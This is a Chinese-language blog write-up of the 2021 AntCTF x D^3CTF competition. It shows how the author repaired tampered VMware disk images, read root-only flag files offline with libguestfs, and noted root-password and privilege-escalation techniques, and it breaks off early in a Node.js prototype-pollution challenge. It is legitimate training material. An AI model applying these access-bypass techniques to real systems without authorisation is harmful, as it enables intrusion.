@@ -1,0 +1,1864 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="CTF | 2021 AntCTF x D^3CTF WriteUp, MiaoTony">
+    <meta name="description" content="前几天打了个AntCTF x D^3CTF，题目还是挺有难度的，喵喵只会签到问卷和虚拟机了，这就爬走。">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159946730-1"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'UA-159946730-1');
+</script>
+
+
+    <title>CTF | 2021 AntCTF x D^3CTF WriteUp | MiaoTony&#39;s小窝</title>
+    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/favicon.ico">
+
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/css/matery.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/css/my.css">
+	
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/jquery/jquery.min.js"></script>
+    <script>
+        //来个特效玩玩喵 20200123
+        var titleTime;
+        var OriginTitile = document.title;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = '|ω·) 喵~快回来呀！';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(/≧▽≦)/ Meow！';
+                titleTime = setTimeout(function() {
+        	    document.title = OriginTitile;
+        }, 800);
+    }
+        });
+    </script>
+<meta name="generator" content="Hexo 5.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="MiaoTony's小窝" type="application/atom+xml">
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">MiaoTony&#39;s小窝</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友链</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">MiaoTony&#39;s小窝</div>
+        <div class="logo-desc">
+            
+            喵~欢迎各位大佬的来访呀！
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友链
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/miaotony" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/miaotony" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+<script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/featureimages/20.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">CTF | 2021 AntCTF x D^3CTF WriteUp</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        min-width: 240px;
+        padding-left: 15px;
+        padding-bottom: 30px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 30px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+	    max-height: 450px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                            <a href="/tags/WriteUp/">
+                                <span class="chip bg-color">WriteUp</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-03-09
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    4.1k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    18 分
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p><img src="/2021/03/09/CTF_2021Ant-D3CTF/banner.jpg"></p>
+<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p><strong>2021 AntCTF x D^3CTF</strong></p>
+<blockquote>
+<p>AntCTF x D^3CTF 是蚂蚁集团安全响应中心（AntSRC）携手三支“电子科大”队伍：<strong>杭电 Vidar-Team</strong>、<strong>西电 L-Team</strong> 及<strong>成电 CNSS</strong> 共同举办的 CTF 赛事（暨第十二届 HCTF、第五届 LCTF）</p>
+<p><strong>线上赛</strong> 3月5日 20:00－3月7日 20:00</p>
+<p>介绍页面： <a target="_blank" rel="noopener" href="https://d3ctf.io/">https://d3ctf.io/</a></p>
+<p>比赛平台： <a target="_blank" rel="noopener" href="https://ant-d3ctf.alipay.com/">https://ant-d3ctf.alipay.com/</a></p>
+</blockquote>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210312212948787.png"></p>
+<p>前不久看群里师傅推了这个比赛，就来打打玩玩好了。</p>
+<p>比赛题目放出来才发现还是挺有难度的，于是喵喵也不会做，大哭呜呜呜。</p>
+<p>和队里师傅一起打的，这里就简单写写我做的吧。</p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Virtual-Love"><a href="#Virtual-Love" class="headerlink" title="Virtual Love"></a>Virtual Love</h3><blockquote>
+<p>You say you love me, but you don’t know me at all! Your love…Your love is all virtual!<strong>（Login User: guest）<br>The second part of the attachment：</strong><br><a target="_blank" rel="noopener" href="https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLove_7992f13b4b66efb5156f17698f69c0e3.part2.rar">https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLove_7992f13b4b66efb5156f17698f69c0e3.part2.rar</a><br><strong>Flag Format: d3ctf{this_is_a_sample_flag}</strong></p>
+<p><a target="_blank" rel="noopener" href="https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLove_7992f13b4b66efb5156f17698f69c0e3.part1.rar">https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLove_7992f13b4b66efb5156f17698f69c0e3.part1.rar</a> </p>
+</blockquote>
+<p>好家伙，6GiB 的 Vmware 虚拟机镜像！</p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210306231110115.png"></p>
+<p>解压出来导入 Vmware，发现需要密码。</p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210306231222153.png"></p>
+<p>第一次遇到这种题唉，于是想到爆破这个密码。</p>
+<p>GitHub 上找到了 <strong><a target="_blank" rel="noopener" href="https://github.com/axcheron/pyvmx-cracker">pyvmx-cracker</a></strong> 这个工具，但是跑了 10W+ 的字典都没跑出来，于是放弃。</p>
+<p>又想到能不能直接导入虚拟机镜像 vmdk 啊，试了试还是报错了。</p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210306231436850.png"></p>
+<p>再去看看 <code>VirtualLove-s00*.vmdk</code> 文件，找个正常的比对了一下，好家伙，去掉了文件头啊！</p>
+<p>改好文件头，再一看还是不对啊！！！</p>
+<p>再比对了亿下，怎么还去掉了文件头部另外一段……</p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210306231737549.png"></p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210307012353570.png" alt="修改后"></p>
+<p>嗯，到这里还是报错。</p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210306232222852.png" alt="坏坏"></p>
+<p>再看 <code>VirtualLove.vmdk</code>，发现把 <code>version</code> 标记给整没了。</p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210306232343325.png"></p>
+<p>加上，终于能够正常启动了。</p>
+<p><code>guest</code> 用户登录。</p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210306232448738.png"></p>
+<p>坏耶！有假的 flag！</p>
+<p>提示需要进入 root，于是试着提权。</p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210306232527801.png" alt="系统信息"></p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210306232541721.png" alt="sudo"></p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210306232652077.png" alt="suid"></p>
+<p>坏耶！都最新版本了！看上去 setuid 提权也不大行。<code>/etc/passwd</code> 也不可写。计划任务也不行。</p>
+<p>（查了半天怎么提权，我好菜啊喵呜呜</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pzzning/p/6220977.html">Centos普通用户提权至ROOT</a> <strong>利用 <code>/bin/ping</code> rws 中的 s 的漏洞</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/129549.html">Linux提权：从入门到放弃</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7924">对Linux 提权的简单总结</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86979">【安全科普】Linux提权——利用可执行文件SUID</a></p>
+<p>etc.</p>
+</blockquote>
+<p>发现貌似一个都提不了权。</p>
+<p>再后来，想到我有镜像啊，何必呢！我可以改 root 用户的密码啊。</p>
+<p>GitHub 上找到了个 <strong><a target="_blank" rel="noopener" href="https://github.com/xuriwuyun/change-root-passwd">change-root-passwd</a></strong></p>
+<blockquote>
+<p>可以参考 <a target="_blank" rel="noopener" href="https://blog.csdn.net/xuriwuyun/article/details/41283077">修改虚拟机镜像的root密码</a> 这篇来实现。</p>
+</blockquote>
+<p>再进一步，我都有镜像了，啥都能提取的啊！啊我是废物呜呜呜。</p>
+<p>于是又找到了 <strong>Libguestfs</strong>，<strong>一个用来访问和修改虚拟机磁盘镜像的一个工具集</strong></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/c154f43b7fac">虚拟机镜像管理工具– Libguestfs</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wenwenxiong/article/details/52223731">CentOS7.1 KVM虚拟化之libguestfs-tools工具常用命令介绍</a></p>
+</blockquote>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> libguestfs-tools
+virt-ls VirtualLove.vmdk /root
+virt-cat VirtualLove.vmdk /root/flagggg.txt</code></pre>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210307001935932.png"></p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210307001943346.png"></p>
+<p><code>d3ctf{Vmw@RE_1s_5o_C0mpl3x_b99d1320cf}</code></p>
+<h3 id="Virtual-Love-Revenge"><a href="#Virtual-Love-Revenge" class="headerlink" title="Virtual Love_Revenge"></a>Virtual Love_Revenge</h3><blockquote>
+<p><strong><em>I’m coming for revenge.</em></strong><br>You say you love me, but you don’t know me at all! Your love…Your love is all virtual!<strong>（Login User: guest）<br>The second part of the attachment：</strong><br><a target="_blank" rel="noopener" href="https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLoveRevenge_cf424dd60a5d269b06ecfecfbd59deb9.part2.rar">https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLoveRevenge_cf424dd60a5d269b06ecfecfbd59deb9.part2.rar</a><br><strong>Flag Format: d3ctf{this_is_a_sample_flag}</strong></p>
+<p><a target="_blank" rel="noopener" href="https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLoveRevenge_cf424dd60a5d269b06ecfecfbd59deb9.part1.rar">https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLoveRevenge_cf424dd60a5d269b06ecfecfbd59deb9.part1.rar</a> </p>
+</blockquote>
+<p>又是 6GiB 的虚拟机镜像，喂，这比赛占了我硬盘巨大空间啊喂！</p>
+<p>另外还有个 <code>true_flag.rar</code></p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210307003134844.png" alt="true_flag.rar"></p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210307002713763.png"></p>
+<p>这次还是照样改 <code>VirtualLove-s00*.vmdk</code> 文件头部。</p>
+<p>以及 <code>VirtualLove.vmdk</code> 改的真多</p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210307002811568.png" alt="改的真多"></p>
+<p>然后一样新建虚拟机导入镜像。</p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210307003003199.png"></p>
+<p>还是一样的假 flag。</p>
+<p>用 libguestfs-tools 看看 <code>/root</code>，然后读取这个文件。</p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210307003234470.png"></p>
+<pre class="language-none"><code class="language-none">f5`FU2)I$F0Oc'qL@pP)S</code></pre>
+<p>这个就是压缩包的密码。</p>
+<p>解压拿到 flag</p>
+<p><code>d3ctf{Vmw@RE_1s_5oooo_C0mpl3x_ec4bb60e58}</code></p>
+<blockquote>
+<p>其实这里我还寻思着是不是漏了啥呢，是不是还套了好几步，于是还想着改 root 密码（（</p>
+<p>BTW, <code>anaconda-ks.cfg</code> 这个文件里就存了 root 的密码</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Spiro-K/p/6597674.html">Linux:root下的文件-anaconda-ks.cfg详解</a></p>
+<p>以及 通过 单用户模式 或者 救援模式 rescue mode 去更改 root 密码。</p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-forget-password.html">Linux  忘记密码解决方法</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/feiquan/p/9225427.html">Linux中Root密码破解</a></p>
+</blockquote>
+<h3 id="Virtual-Love-Revenge2-0"><a href="#Virtual-Love-Revenge2-0" class="headerlink" title="Virtual Love_Revenge2.0"></a>Virtual Love_Revenge2.0</h3><blockquote>
+<p><strong><em>I’m coming for revenge again.\</em></strong><br>You say you love me, but you don’t know me at all! Your love…Your love is all virtual!<strong>（Login User: guest）<br>The second part of the attachment：</strong><br><a target="_blank" rel="noopener" href="https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLoveRevenge2.0_66a25efc5cbcf0b7a9fdab312c3e70aa.part2.rar">https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLoveRevenge2.0_66a25efc5cbcf0b7a9fdab312c3e70aa.part2.rar</a><br><strong>Flag Format: d3ctf{this_is_a_sample_flag}</strong></p>
+<p><a target="_blank" rel="noopener" href="https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLoveRevenge2.0_66a25efc5cbcf0b7a9fdab312c3e70aa.part1.rar">https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Misc/VirtualLoveRevenge2.0_66a25efc5cbcf0b7a9fdab312c3e70aa.part1.rar</a> </p>
+</blockquote>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210307014130599.png"></p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210307014357498.png" alt="怎么这比赛这么占空间"></p>
+<p>喂！！！有完没完啊！太有毒了！</p>
+<p>（怎么这比赛这么占硬盘空间</p>
+<p>先是和上一题一样的操作，做的要吐了……</p>
+<p>然后之后看图。</p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210307013955561.png"></p>
+<p>压缩包密码</p>
+<pre class="language-none"><code class="language-none">2F!,O&lt;DJ+@&lt;*K0@&lt;6L(Df-</code></pre>
+
+
+<pre class="language-none"><code class="language-none">d3ctf{Vmw@RE_1s_5ooo_C0mpl3x_[目标文件md5]}
+d3ctf{Vmw@RE_1s_5ooo_C0mpl3x_8cf8463b34caa8ac871a52d5dd7ad1ef}</code></pre>
+<p><strong>好耶，是一血！</strong></p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210307014213452.png"></p>
+<blockquote>
+<p>（盲猜是不是之前的题目有人直接 grep / binwalk 或者怎么样提取到了字符串什么的吧</p>
+<p>问了出题人说非预期是 压缩包的密码和最开始版本的 flag 在同一个位置，没进行其他处理，所以直接就能在010里找到。</p>
+<p>预期解是爆破 vmx 的密码，字典隐写在 log 里了。然后修复 vmx，再修修其他的几个文件就可以进去了。</p>
+<p>emmmm</p>
+</blockquote>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="8-bit-pub"><a href="#8-bit-pub" class="headerlink" title="8-bit pub"></a>8-bit pub</h3><blockquote>
+<p>Wellcome to 8-bit pub, take a seat and enjoy drinking here!<br>Attachment: <a target="_blank" rel="noopener" href="https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Web/8-bit_pub_e7b8ca6dc23b59b42e8b5900b62c61506ad0ca34.zip">https://d3ctf-2021.oss-cn-shanghai.aliyuncs.com/Web/8-bit_pub_e7b8ca6dc23b59b42e8b5900b62c61506ad0ca34.zip</a><br>PS: Try to execute /readflag<br>PPS: The container restarts every 3 minutes<br><strong>Flag Format: d3ctf{this_is_a_sample_flag}</strong></p>
+<p>Challenge Address</p>
+<p><a target="_blank" rel="noopener" href="http://6d5f59df15.8bit-pub.d3ctf.io/">http://6d5f59df15.8bit-pub.d3ctf.io</a> </p>
+</blockquote>
+<p>给了源码，直接看，是 Nodejs。</p>
+<p>盲猜又是<strong>原型链污染</strong>。于是就去找有没有。</p>
+<p>看了一下依赖的版本都挺新的，emmm。（可以试试 <code>npm audit</code></p>
+<p>发现给的源码中唯一一处可能的是在发邮件这里。</p>
+<p><code>controllers/adminController.js</code></p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> send <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"../utils/mail"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> shvl <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"shvl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>
+  <span class="token function-variable function">home</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">sendView</span><span class="token punctuation">(</span><span class="token string">"admin.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span><span class="token punctuation">,</span>
+
+  <span class="token function-variable function">email</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">let</span> contents <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+    Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">key</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
